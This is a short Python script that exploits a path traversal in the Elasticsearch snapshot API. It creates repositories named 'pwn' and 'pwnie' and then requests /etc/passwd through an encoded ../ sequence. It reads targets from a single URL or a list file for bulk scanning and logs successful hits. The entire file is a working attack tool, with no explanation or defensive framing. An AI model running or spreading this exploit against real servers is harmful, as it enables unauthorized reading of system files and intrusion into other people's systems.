# -*- coding: utf-8 -*-
import requests
import argparse

succlog=open('result.txt','a')

headers = {
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'
	}

def exploit(target):

	try:
		url1 = target+'/_snapshot/pwn'
		r=requests.post(url1,headers=headers,timeout=5, data='{"type":"fs","settings":{"location":"dsr"}}')

		url2 = target+"/_snapshot/pwnie"
		r2=requests.post(url2,headers=headers,timeout=5, data='{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}')
		if 'acknowledged' in r.content and 'acknowledged' in r2.content:
			print('good')
			grabFile(target)
	except:
		pass

def grabFile(target):
	url = target+'/_snapshot/pwn/ev1l%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
	try:
		r=requests.get(url,headers=headers,timeout=5)
		if r.status_code==200:
			succlog.write(url+'\n')
	except:
		pass





if __name__=='__main__':
    parser = argparse.ArgumentParser(description='api help')
    parser.add_argument('-u', '--url', help='Please Input a url!', default='')
    parser.add_argument('-f', '--file', help='Please Input a file!', default='')
    args = parser.parse_args()
    url = args.url
    file = args.file
    if url!='':
        exploit(url)
    if file!="":
        f = open(file, 'r+')
        for i in f.readlines():
            url = i.strip()
            exploit(url)